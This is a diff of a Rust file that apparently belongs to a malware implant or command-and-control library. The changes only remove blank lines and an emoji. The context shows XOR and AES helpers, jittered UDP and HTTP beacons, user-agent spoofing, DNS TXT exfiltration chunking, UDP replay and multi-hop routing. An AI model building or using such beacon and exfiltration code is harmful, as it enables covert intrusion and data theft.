@@ -11,7 +11,6 @@ use std::io::Write;
 use std::fs;
 
 /// === CRYPTO PRIMITIVES ===
-
 pub fn xor_encode(data: &[u8], key: u8) -> Vec<u8> {
     data.iter().map(|b| b ^ key).collect()
 }
@@ -46,7 +45,6 @@ pub fn aes_gcm_decrypt(data: &[u8], key_hex: &str, nonce_hex: &str) -> Result<Ve
 }
 
 /// === NETWORK BEACONS ===
-
 pub fn jitter_delay(base_secs: u64, jitter_percent: f64) -> u64 {
     let jitter = (base_secs as f64 * jitter_percent) as u64;
     let offset = thread_rng().gen_range(0..=jitter);
@@ -77,7 +75,6 @@ pub fn user_agent_profiles(profile: &str) -> &'static str {
 }
 
 /// === TRANSPORTS ===
-
 pub fn udp_beacon(ip: &str, port: u16, payload: &[u8]) -> std::io::Result<()> {
     let sock = UdpSocket::bind("0.0.0.0:0")?;
     sock.send_to(payload, format!("{}:{}", ip, port))?;
@@ -102,7 +99,6 @@ pub fn http_get_beacon(url: &str, query: &str, ua_profile: &str) -> Result<Strin
 }
 
 /// === EXFIL + REPLAY ===
-
 pub fn encode_dns_txt_chunks(data: &[u8], max_len: usize) -> Vec<String> {
     let b64 = base64_encode(data);
     b64.as_bytes()
@@ -124,8 +120,7 @@ pub fn replay_from_file(path: &str, ip: &str, port: u16) -> std::io::Result<()> 
     udp_beacon(ip, port, &data)
 }
 
-/// === 🧅 ONION-LIKE ROUTING (Multi-Hop) ===
-
+/// === ONION-LIKE ROUTING (Multi-Hop) ===
 pub fn multi_hop_route(
     hops: &[(&str, u16)],
     encrypted_blob: &[u8],
